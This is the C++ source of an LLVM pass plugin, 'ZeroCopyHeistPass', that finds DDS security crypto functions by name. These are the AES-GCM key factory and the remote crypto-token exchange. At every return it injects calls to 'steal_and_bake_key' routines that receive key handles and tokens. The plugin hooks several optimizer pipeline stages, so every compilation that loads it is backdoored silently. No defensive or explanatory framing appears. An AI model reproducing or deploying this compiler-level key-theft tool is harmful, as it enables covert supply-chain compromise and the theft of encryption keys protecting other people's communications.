#include "llvm/Passes/PassBuilder.h"
#include "llvm/Passes/PassPlugin.h"
#include "llvm/IR/PassManager.h"
#include "llvm/IR/IRBuilder.h"
#include "llvm/IR/Module.h"
#include "llvm/IR/Function.h"
#include "llvm/IR/Instructions.h"
#include "llvm/IR/Type.h"
#include "llvm/Support/raw_ostream.h"

using namespace llvm;

namespace {

struct ZeroCopyHeistPass : public PassInfoMixin<ZeroCopyHeistPass> {

    PreservedAnalyses run(Function &F, FunctionAnalysisManager &FAM) {
        StringRef FuncName = F.getName();
        
        // [Core Modification] Separate target functions (TX is Phase 2, RX is Phase 4)
        bool isTX = FuncName.contains("register_local_datawriter") && FuncName.contains("AESGCMGMAC_KeyFactory");
        bool isRX = FuncName.contains("set_remote_datawriter_crypto_tokens") && FuncName.contains("AESGCMGMAC_KeyExchange");

        if (!isTX && !isRX) return PreservedAnalyses::all();

        errs() << "\n[ZeroCopyHeistPass] Target Function Found: " << FuncName << "\n";

        Module *M = F.getParent();
        LLVMContext &Ctx = M->getContext();
        PointerType *PtrTy = Type::getInt8PtrTy(Ctx); 
        
        FunctionCallee TXStealFunc = M->getOrInsertFunction("steal_and_bake_key", Type::getVoidTy(Ctx), PtrTy);
        FunctionCallee RXStealFunc = M->getOrInsertFunction("steal_and_bake_key_rx", Type::getVoidTy(Ctx), PtrTy);

        bool Changed = false;

        for (BasicBlock &BB : F) {
            for (auto IT = BB.begin(), E = BB.end(); IT != E; ) {
                Instruction &I = *IT++;
                if (ReturnInst *RetInst = dyn_cast<ReturnInst>(&I)) {
                    IRBuilder<> Builder(RetInst);
                    
                    if (isTX) {
                        // TX: Intercept the handle (return value) that was just generated
                        Value *RetVal = RetInst->getReturnValue();
                        if (RetVal) {
                            Value *CastVal = Builder.CreateBitCast(RetVal, PtrTy);
                            Builder.CreateCall(TXStealFunc, {CastVal});
                            Changed = true;
                            errs() << "\n[success] >>> <steal_and_bake_key> ";
                        }
                    } else if (isRX) {
                        // RX: Since the return value is a boolean, intercept the reference to the second argument (remote_datawriter_crypto)!
                        // [Modification] Since this is a C++ member function, Arg(0) is 'this'.
                        // Arg(1): local_reader, Arg(2): remote_writer
                        Value *Arg1 = F.getArg(2); 
                        Value *CastVal = Builder.CreateBitCast(Arg1, PtrTy);
                        Builder.CreateCall(RXStealFunc, {CastVal});
                        Changed = true;
                        errs() << "\n[success] >>> <steal_and_bake_key_rx> ";
                    }
                }
            }
        }
        
        if (Changed) return PreservedAnalyses::none();
        return PreservedAnalyses::all();
    }
};
} // end anonymous namespace

llvm::PassPluginLibraryInfo getZeroCopyHeistPassPluginInfo() {
    return {LLVM_PLUGIN_API_VERSION, "ZeroCopyHeistPass", LLVM_VERSION_STRING,
            [](PassBuilder &PB) {
                auto injectPass = [](ModulePassManager &MPM, OptimizationLevel Level) {
                    MPM.addPass(createModuleToFunctionPassAdaptor(ZeroCopyHeistPass()));
                };
                PB.registerPipelineStartEPCallback(injectPass);
                PB.registerOptimizerLastEPCallback(injectPass);
                PB.registerPipelineEarlySimplificationEPCallback(injectPass);
            }};
}
extern "C" LLVM_ATTRIBUTE_WEAK ::llvm::PassPluginLibraryInfo llvmGetPassPluginInfo() {
    return getZeroCopyHeistPassPluginInfo();
}